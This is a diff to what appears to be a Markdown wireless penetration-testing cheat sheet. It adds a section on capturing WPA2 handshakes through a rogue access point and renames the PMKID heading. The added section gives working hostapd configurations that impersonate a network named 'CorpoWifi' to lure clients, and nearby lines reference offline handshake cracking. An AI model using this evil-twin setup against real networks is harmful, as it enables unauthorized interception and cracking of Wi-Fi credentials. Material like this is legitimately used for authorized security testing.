@@ -54,8 +54,9 @@
       - [Cracking WPA2 handshake](#cracking-wpa2-handshake)
         - [Dictionnary attack](#dictionnary-attack)
         - [Pre Computed PMK](#pre-computed-pmk)
+      - [WPA2 App Less Attack](#wpa2-app-less-attack)
       - [KARMA Attack](#karma-attack)
-      - [PMKID](#pmkid)
+      - [PMKID Attack](#pmkid-attack)
       - [KRACK Attack](#krack-attack)
       - [FRAG Attack](#frag-attack)
     - [WPA2-EAP (Enterprise)](#wpa2-eap-enterprise)
@@ -562,9 +563,43 @@ cowpatty -d precomputed_PMK -s CorpoWifi -f wordlistPassphrase.txt
 
 <img src="./images/pre_computed.png" width="500"/>
 
+
+#### WPA2 App Less Attack
+You will need to have a probing client within the vicinity or range, create a fake access point, wait the client for connect and capture the 4-way handshake.
+
+```
+hostapd wpa-psk.conf
+```
+
+wpa1-psk.conf
+```
+interface=wlan1
+driver=nl80211
+ssid=CorpoWifi
+bssid=00:1C:10:00:00:00
+wpa=2
+wpa_passphrase=wedontcare
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=TKIP
+channel=1
+```
+
+wpa2-psk.conf
+```
+interface=wlan1
+driver=nl80211
+ssid=CorpoWifi
+bssid=00:1C:10:00:00:00
+wpa=2
+wpa_passphrase=wedontcare
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+channel=1
+```
+
 #### KARMA Attack
 
-#### PMKID
+#### PMKID Attack
 
 Cracking PMKID hashes using hashcat (newer version of hashcat -m 22000)
 ```
